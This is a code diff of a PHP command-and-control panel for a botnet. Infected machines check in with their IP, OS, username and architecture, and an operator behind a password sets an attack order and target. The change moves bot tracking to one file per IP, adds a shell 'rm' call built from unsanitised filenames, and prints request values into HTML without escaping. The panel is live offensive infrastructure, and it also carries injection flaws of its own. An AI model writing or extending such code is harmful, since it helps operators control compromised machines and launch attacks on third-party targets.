@@ -21,7 +21,6 @@
 */
 
 $configFile = "data/config";
-$botFile = "data/bots";
 $passFile = "data/password";
 
 // load config (parameters for attack)
@@ -47,61 +46,36 @@ if($_GET['p'] == "bot") {
 
 	// save bot parameter
 	$clientIpAddress = $_SERVER["REMOTE_ADDR"];
-	// read bots
-	$bots = fopen($botFile, "r");
-	$botsContent = fread($bots, filesize($botFile));
-	fclose($bots);
-	$botsContent = explode("\n", $botsContent);
-	$writeBotsContent = "";
-	$botInList = 0;
-	for($i = 0; $i < count($botsContent); $i++) {
-		$curBot = explode(" ", $botsContent[$i]);
-		// if current bot already in list update timestamp
-		if($curBot[0] == $clientIpAddress) {
-			$botsContent[$i] = $clientIpAddress." ".$timestamp." ".$_GET['os']." ".$_GET['username']." ".$_GET['version']." ".$_GET['osdetail']." ".$_GET['architecture'];
-			$writeBotsContent = $writeBotsContent.$botsContent[$i]."\n";
-			$botInList = 1;
-		}
-		// if bot in list is out of date, remove him
-		elseif(($timestamp - (int)$curBot[1]) > 60) {
-			// pass
-		}
-		else {
-			$writeBotsContent = $writeBotsContent.$botsContent[$i]."\n";
+
+	// save bot if he not exists and override timestamp if he already exists
+	$saveBot = fopen("data/bots/".$clientIpAddress, "w+");
+	$writeBotsContent = $timestamp.";".$_GET['os'].";".$_GET['username'].";".$_GET['version'].";".$_GET['osdetail'].";".$_GET['architecture'];
+	fwrite($saveBot, $writeBotsContent);
+	fclose($saveBot);
+	// delete all timed out bots
+	$allBots = scandir("data/bots/");
+	foreach($allBots as $bot) {
+		$tmpBot = fopen("data/bots/".$bot, "r");
+		$tmpBotContent = fread($tmpBot, filesize("data/bots/".$bot));
+		fclose($tmpBot);
+		$tmpBotContent = explode(";", $tmpBotContent);
+		if(($timestamp - (int)$tmpBotContent[0]) > 60) {
+			system("rm data/bots/".$bot);
 		}
 	}
-
-	if ($botInList == 0) {
-		// check for sqli/xss
-		$writeBotsContent = $writeBotsContent.$clientIpAddress." ".$timestamp." ".$_GET['os']." ".$_GET['username']." ".$_GET['version']." ".$_GET['osdetail']." ".$_GET['architecture'];
-	}
-
-	$writeBots = fopen($botFile, "w");
-	fwrite($writeBots, $writeBotsContent);
-	fclose($writeBots);
 }
 elseif(hash("sha512", $_GET['p']) == $curPw) {
-	// delete timed out bots
-	// read bots
-        $bots = fopen($botFile, "r");
-        $botsContent = fread($bots, filesize($botFile));
-        fclose($bots);
-        $botsContent = explode("\n", $botsContent);
-        $writeBotsContent = "";
-	for($i = 0; $i < count($botsContent); $i++) {
-		$curBot = explode(" ", $botsContent[$i]);
-		// if bot in list is out of date, remove him
-                if(($timestamp - (int)$curBot[1]) > 60) {
-                        // pass
+ 	// delete all timed out bots
+        $allBots = scandir("data/bots/");
+        foreach($allBots as $bot) {
+                $tmpBot = fopen("data/bots/".$bot, "r");
+                $tmpBotContent = fread($tmpBot, filesize("data/bots/".$bot));
+                fclose($tmpBot);
+                $tmpBotContent = explode(";", $tmpBotContent);
+                if(($timestamp - (int)$tmpBotContent[0]) > 60) {
+                        system("rm data/bots/".$bot);
                 }
-                else {
-                        $writeBotsContent = $writeBotsContent.$botsContent[$i]."\n";
-                }
-
-	}
-	$writeBots = fopen($botFile, "w");
-        fwrite($writeBots, $writeBotsContent);
-        fclose($writeBots);
+        }
 
 	// save new config
 	if($_GET['order'] != "" && $_GET['target'] != "") {
@@ -204,11 +178,8 @@ elseif(hash("sha512", $_GET['p']) == $curPw) {
 	print "<td class=\"attackStatusColumn\">".$target."</td></tr>";
 	print "<tr><td class=\"attackStatusColumn\">Bots Online:</td>";
 	print "<td class=\"attackStatusColumn\">";
-	$activeBots = fopen($botFile, "r");
-        $content = fread($activeBots, filesize($botFile));
-        fclose($activeBots);
-        $number = explode("\n", $content);
-        print count($number)-1;
+	$allBots = scandir("data/bots/");
+	print count($allBots)-2;
 	print "</td></tr>";
 
 	print "</table>";
@@ -239,32 +210,33 @@ elseif(hash("sha512", $_GET['p']) == $curPw) {
         print "<div>";
 	print "<table border=\"1\" class=\"attackStatusTable\" cellspacing=\"0\">";
 
-	$allBots = fopen($botFile, "r");
-        $allBotsContent = fread($allBots, filesize($botFile));
-        fclose($bots);
-	$allBotsContent = explode("\n", $allBotsContent);
-
 	print "<tr><td class=\"attackStatusHead\">IP</td><td class=\"attackStatusHead\">System Name</td><td class=\"attackStatusHead\">Operating System</td><td class=\"attackStatusHead\">Architecture</td></tr>";
-	if(count($allBotsContent) == 1) {
+	$allBots = scandir("data/bots/");
+	if(count($allBots) <= 2) {
 		print "<tr><td colspan=\"4\" class=\"attackStatusColumn\">No entries.</td></tr>";
 	}
-	for($i = 0; $i < count($allBotsContent)-1; $i++) {
-		$curBot = explode(" ", $allBotsContent[$i]);
-        	print "<tr><td class=\"attackStatusColumn\">".$curBot[0]."</td>";
-        	print "<td class=\"attackStatusColumn\">";
-		print $curBot[3];
-		print "</td>";
-		print "<td class=\"attackStatusColumn\">";
-        	print $curBot[2]." ".$curBot[4]." (".$curBot[5].")";
-        	print "</td>";
-		print "<td class=\"attackStatusColumn\">";
-        	print $curBot[6];
-        	print "</td>";
+	else {
+		foreach($allBots as $bot) {
+			if($bot != "." && $bot != "..") {
+				$tmpBot = fopen("data/bots/".$bot, "r");
+                		$tmpBotContent = fread($tmpBot, filesize("data/bots/".$bot));
+                		fclose($tmpBot);
+                		$curBot = explode(";", $tmpBotContent);
+        			print "<tr><td class=\"attackStatusColumn\">".$bot."</td>";
+        			print "<td class=\"attackStatusColumn\">";
+				print $curBot[2];
+				print "</td>";
+				print "<td class=\"attackStatusColumn\">";
+        			print $curBot[1]." ".$curBot[3]." (".$curBot[4].")";
+        			print "</td>";
+				print "<td class=\"attackStatusColumn\">";
+        			print $curBot[5];
+        			print "</td>";
+			}
+		}
 	}
-
         print "</table>";
 	print "</div>";
-
 	print "</div>";
 	print "</div>";
 
